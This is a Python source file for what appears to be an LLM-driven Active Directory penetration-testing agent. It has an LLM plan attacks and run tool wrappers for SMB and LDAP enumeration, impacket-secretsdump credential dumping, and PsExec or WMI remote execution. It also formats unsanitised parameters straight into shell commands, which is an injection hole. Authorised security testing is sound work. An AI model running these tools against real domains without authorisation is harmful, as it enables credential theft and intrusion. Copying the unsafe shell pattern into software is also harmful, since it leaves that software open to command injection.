"""Active Directory penetration testing agent.

Capabilities:
- Domain enumeration (users, groups, computers, trusts, GPOs)
- Credential-based attacks (Kerberoasting, AS-REP roasting)
- Lateral movement (Pass-the-Hash, PsExec, WMI, WinRM)
- Privilege escalation (DCSync, ACL abuse)
- Persistence (Golden Ticket, Silver Ticket)

Reference: Cochise planner/executor architecture
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional

from darwin.dkg import DKG
from darwin.sub_agents.base import BaseSubAgent, SubAgentResult, TokenBudget, AgentType
from darwin.tools.mcp_gateway import MCPGateway, ToolResult
from darwin.utils.llm import LLMSession


class ADAgent(BaseSubAgent):
    """Active Directory penetration testing agent for Windows domain environments."""

    def __init__(
        self,
        agent_id: str,
        task_scope: Any = None,
        dkg: DKG | None = None,
        budget: TokenBudget | None = None,
        llm_session: LLMSession | None = None,
        domain_context: dict | None = None,
    ):
        from darwin.prompts.ad_agent import (
            SYSTEM_PROMPT_AD,
            SYSTEM_PROMPT_AD_EVALUATE,
            SYSTEM_PROMPT_AD_REPLAN,
        )

        tools = self._create_ad_tools()
        super().__init__(
            agent_id=agent_id,
            agent_type=AgentType.AD,
            task_scope=task_scope,
            dkg=dkg,
            budget=budget or TokenBudget(),
            tools=tools,
            llm_session=llm_session,
        )
        self.domain_context = domain_context or {}
        self._system_prompt = SYSTEM_PROMPT_AD
        self._evaluate_prompt = SYSTEM_PROMPT_AD_EVALUATE
        self._replan_prompt = SYSTEM_PROMPT_AD_REPLAN

    def _create_ad_tools(self) -> MCPGateway:
        gateway = MCPGateway()

        def _register(cmd_name, template, desc, params, timeout=30):
            async def _run(**kwargs) -> ToolResult:
                import asyncio
                cmd = template.format(**kwargs)
                try:
                    proc = await asyncio.create_subprocess_shell(
                        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
                    return ToolResult(tool_name=cmd_name, success=(proc.returncode == 0),
                        stdout=stdout.decode("utf-8", errors="replace")[:5000],
                        stderr=stderr.decode("utf-8", errors="replace")[:1000],
                        exit_code=proc.returncode or 0, elapsed_ms=0)
                except asyncio.TimeoutError:
                    return ToolResult(tool_name=cmd_name, success=False,
                        stdout="", stderr="timeout", exit_code=1, elapsed_ms=0)
                except Exception as e:
                    return ToolResult(tool_name=cmd_name, success=False,
                        stdout="", stderr=str(e), exit_code=1, elapsed_ms=0)
            gateway.register(name=cmd_name, func=_run, description=desc, parameters=params)

        _register("netexec_enum", "netexec smb {target} --shares 2>&1",
            "Enumerate SMB shares on target", {"target": {"type": "string", "description": "Target IP or hostname"}})
        _register("netexec_ldap_enum", "netexec ldap {target} -u {user} -p {password} --users 2>&1",
            "Enumerate AD users via LDAP",
            {"target": {"type": "string"}, "user": {"type": "string"}, "password": {"type": "string"}})
        _register("impacket_secretsdump", "impacket-secretsdump {target} 2>&1 | head -100",
            "Dump SAM/LSA secrets from target",
            {"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@TARGET"}})
        _register("impacket_psexec", "impacket-psexec {target} 2>&1",
            "Execute commands via PsExec",
            {"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@TARGET"}})
        _register("impacket_wmiexec", "impacket-wmiexec {target} 2>&1",
            "Execute commands via WMI", {"target": {"type": "string"}})
        _register("ldapsearch_ad", "ldapsearch -x -H ldap://{target} -D '{user}@{domain}' -w '{password}' -b '{base_dn}' 2>&1 | head -50",
            "Query LDAP directory", {"target": {"type": "string"}, "user": {"type": "string"},
            "password": {"type": "string"}, "domain": {"type": "string"}, "base_dn": {"type": "string"}})
        return gateway

    async def _generate_plan(self) -> List[Dict[str, Any]]:
        tools = sorted(self.tools.get_tool_names()) if self.tools else []
        dc_ip = self.domain_context.get("dc_ip", "") or (
            self.task_scope.target_hosts[0] if self.task_scope and self.task_scope.target_hosts else "")
        prompt = f"""Domain: {self.domain_context.get('domain_name', 'unknown')}
DC: {dc_ip}
Credentials: {self.domain_context.get('credentials', 'none')}
Hosts: {self.task_scope.target_hosts if self.task_scope else []}
Tools: {', '.join(tools)}

Generate an AD attack plan as JSON array. Each task: id, instruction, tool, params, dependent_task_ids, reason.
Output ONLY valid JSON array. 3-6 tasks."""
        self._maybe_compress()
        content, _ = self.llm.generate(prompt=prompt, system_prompt=self._system_prompt.format(
            domain_name=self.domain_context.get("domain_name", ""),
            dc_ip=dc_ip,
            credentials=str(self.domain_context.get("credentials", "")),
            hosts=str(self.task_scope.target_hosts if self.task_scope else []),
            tools=", ".join(tools),
        ))
        try:
            import re, json
            match = re.search(r'\[.*\]', content, re.DOTALL)
            plan = json.loads(match.group(0)) if match else []
            if plan: return plan
        except Exception: pass
        return [{"id": "enum-1", "instruction": f"Enumerate {dc_ip} via SMB and LDAP",
                 "tool": "netexec_enum", "params": {"target": dc_ip},
                 "dependent_task_ids": [], "reason": "Initial domain enumeration"}]
